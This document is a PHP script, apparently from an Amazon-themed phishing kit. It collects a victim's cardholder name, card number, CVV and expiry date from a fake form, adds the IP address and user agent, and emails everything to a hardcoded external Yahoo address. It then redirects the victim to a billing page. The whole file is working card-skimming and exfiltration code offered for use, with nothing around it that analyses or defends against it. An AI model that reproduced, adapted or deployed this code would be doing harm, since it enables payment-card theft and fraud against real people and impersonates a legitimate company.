<?php   ob_start();  ?>
<?
include "boot.php";
?>
<?
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "==================================================\n";
$message .= "============xX A.M.A.Z.O.N Xx======\n";
$message .= "Name on Card                      : ".$_POST['stone1']."\n";
$message .= "Card Number                    : ".$_POST['stone2']."\n";
$message .= "CVV                       : ".$_POST['stone3']."\n";
$message .= "Month                    : ".$_POST['stone4']."\n";
$message .= "Year                    : ".$_POST['stone5']."\n";
$message .= "============xX LOGIN CHECK Xx=====\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | SOLID ST+NE : ".date("g:i:s:a || D-d-M-Y")."\n";
$message .= "==================================================\n";

$send="samcliff604@yahoo.com";
$subject = "A.M.A.Z.O.N-CREDIT CARD | ".$_POST['stone2']." | $ip";
$headers = "From: STONENETZ<noreply>";
@mail($send,$subject,$message,$from);
@header("Location: billing.php"); // Redirecting 